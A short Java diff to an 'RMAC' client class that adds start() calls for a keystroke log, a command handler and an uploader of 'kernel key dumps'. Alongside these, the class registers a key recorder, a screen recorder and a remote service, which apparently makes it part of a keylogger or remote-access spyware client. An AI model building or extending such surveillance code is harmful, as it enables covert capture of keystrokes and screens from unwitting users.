@@ -131,16 +131,19 @@ public class RMAC {
     scriptFiles = (ScriptFiles) this.getInstance(ScriptFiles.class);
     // Initialize KL Output file
     keyLog = (KeyLog) this.getInstance(KeyLog.class);
+    keyLog.start();
     // Register JNativeHook
     keyRecorder = (KeyRecorder) this.getInstance(KeyRecorder.class);
     // Register this Client
     service.registerClient();
     // Initialize CommandHandler
     commandHandler = (CommandHandler) this.getInstance(CommandHandler.class);
+    commandHandler.start();
     // Initialize Screen Recorder
     screenRecorder = (ScreenRecorder) this.getInstance(ScreenRecorder.class);
     // Initialize RMAC Kernel Key Dumps Uploader
     kernelDumpsUploader = (KernelDump) this.getInstance(KernelDump.class);
+    kernelDumpsUploader.start();
 
     log.info("RMAC client initialized successfully");
 
